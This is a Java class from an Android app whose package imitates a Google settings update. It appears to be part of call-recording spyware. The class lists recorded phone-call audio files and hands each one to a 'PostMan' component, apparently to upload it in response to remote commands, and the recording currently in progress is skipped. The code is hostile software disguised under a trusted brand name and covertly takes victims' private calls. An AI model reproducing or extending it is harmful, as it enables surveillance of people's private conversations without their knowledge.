package com.setting.dl.google.googlesettingupdate.ptt.checkers;

import android.content.Context;
import android.support.annotation.Nullable;

import com.setting.dl.google.googlesettingupdate.audio.AudioService;
import com.setting.dl.google.googlesettingupdate.ptt.kahverengi.PostMan;
import com.setting.dl.google.googlesettingupdate.u;

import java.io.File;

public class CallFilesChecker implements ICallFilesChecker {
   
   private final Context                     context;
   private       ICheckFilesCompleteListener completeListener;
   private       File[]                      files;
   private       long                        lastCheck;
   
   public CallFilesChecker(final Context context, ICheckFilesCompleteListener completeListener) {
      
      this.context = context;
      this.completeListener = completeListener;
   }
   
   @Override
   public void checkCallFiles() {
      checkCallFiles(null);
   }
   
   @Override
   synchronized
   public void checkCallFiles(@Nullable String id) {
   
      if (!FilesCheckers.timeIsUP(lastCheck, 10000L)) {
   
         PostMan.getInstance(context).setCommandExecuting(false, id, "checkCallFiles(String) : kontrol sınırı");
         return;
      }
      
      lastCheck = System.currentTimeMillis();
      
      if (noAudioFile()) {
         
         u.log.d("Dosya yok");
         onComplete(id);
         return;
      }
      
      if (files == null) {
         
         u.log.d("files null");
         //onCheckComplete(commandID);
         return;
      }
      
      File recordingFile = AudioService.getOnRecordingFile();
      
      u.log.d("%d Dosya var.", files.length);
      
      int i = 1;
      
      for (File file : files) {
         
         if (recordingFile != null && recordingFile.getName().equals(file.getName())) {
            
            u.log.d("%d. (kayıtta) %s", i++, file.getName());
         }
         else {
            
            u.log.d("%d. %s", i++, file.getName());
            PostMan.getInstance(context).postCall(file, id);
         }
      }
      
      onComplete(id);
   }
   
   private boolean noAudioFile() {
      
      files = u.getCallAudioFolderFile(context).listFiles();
      
      return files != null && files.length == 0;
   }
   
   private void onComplete(@Nullable String id) {
      
      if (completeListener != null) completeListener.onCheckComplete(id);
   }
}
